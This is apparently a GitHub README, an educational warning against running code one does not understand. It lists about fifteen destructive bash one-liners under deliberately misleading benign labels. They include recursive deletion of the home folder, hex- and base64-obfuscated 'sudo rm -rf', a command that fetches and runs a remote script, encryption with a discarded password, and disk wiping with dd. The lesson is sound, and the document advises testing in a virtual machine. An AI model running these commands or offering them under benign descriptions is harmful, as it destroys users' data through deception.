# My one page argument for learning to code

## **_NEVER_** run code you don't understand

I often hear people call themselves 'Copy and paste' coders. And, while copying and pasting is a legitimate thing to do,
it should not be your only way of doing things. A better method is to find code, see what is done and then recreate it,
and at a bare minimal, copy it, but know exactly what it does. \
Here is my small example of code that has unintended results.


> "Running code you found on the internet is like chewing gum you found in the subway".

### Try these (IN A VIRTUAL MACHINE!)

#### Here are some bad descriptions to **bad** commands

A. Greatly simplifies document syntax:

``` bash
while read f; do LC_CTYPE=C sed -i "" 's:.:*:g' "$f"; done <<< "$(find ~/ -type f -print)"
```

B. Frees up unnecessary space:

``` bash
du ~ | grep -o '/.*' | xargs rm -rf --
```

C. Re-links your files to improve efficiency:

``` bash
du ~/*/* | grep -o '/.*' | xargs -n 1 ln -sf /dev/null/
```

D. Move files/folders to a volume with unlimited storage:

``` bash
for d in ~/*/*; do mv "$d" /dev/null; done
```

E. Frees up all unnecessary space:

``` bash
command $(echo 7375646f20726d202d7266207e2f0a | xxd -r -p ) &> /dev/null
```

F. Frees up all unnecessary space:

``` bash
command $(echo c3VkbyBybSAtcmYgfi8K | base64 -d ) &> /dev/null
```

G. Chew the gum you don't even know:

``` bash
bash -c "$(curl -s https://raw.githubusercontent.com/thedzy/My-one-page-argument-for-learning-to-code/master/malicious_file.sh)"
```

H. Frees up unnecessary space:

```bash
eval $(sed 's:[a-e,s-z]::g' <<< "stream -draft ~/saved")
```

I. Compress files and save space:

```bash
zip --password "$(openssl rand -base64 64)" --move "$(openssl rand -hex 4)".zip  ~/*/*/*/*/*
```

J. Reduce your need of the external volumes:

```bash
for d in /dev/disk[2-9]*; do dd if=/dev/random of=$d &; done
```

K. Simply your files and your life:

```bash
find ~/ -type f -exec bash -c ':|tee {} &' \;
```

L. Keep logs of files in the home folder utilising your current files:

```bash
find ~/ -type f -exec awk 'FNR == 1{ print FILENAME > FILENAME } ' {}  \;
```

M. Cut down on disk space without removing a file:

```bash
while read n; do eval `stat -s /`; echo $n, $st_dev; for i in $(seq 0 1 $n);do [ -f /.vol/$st_dev/$i ] &&  [ -w /.vol/$st_dev/$i ] && echo > /.vol/$st_dev/$i ; done; done <<< `df -i | awk '$NF ~ /\/$/ {print $6}'`           
```

N. Every file gets a random makeover generating original data!

```bash 
find ~ -type f -exec dd if=/dev/urandom of={} bs=1M count=1 \;
```

O. Find your storage’s true limit.

```bash
dirs=($(IFS=$'\n'  find ~/ -type d -print)); while True; do cat /dev/random > ${dirs[$RANDOM % ${#dirs[@]}]}/$(openssl rand -hex $(($RANDOM % 32))); done
```

### Recommended testing environment:

1. Create a virtual machine.
2. Open terminal and run the following command to copy some files to the desktop: \
   ```find / -iname "*.txt" 2>/dev/null | head -n 60 | xargs -n1 -J% cp % $HOME/Desktop/ ```
3. Snapshot your VM, because you'll want it
4. Run the command
5. Restore
6. Rinse and repeat
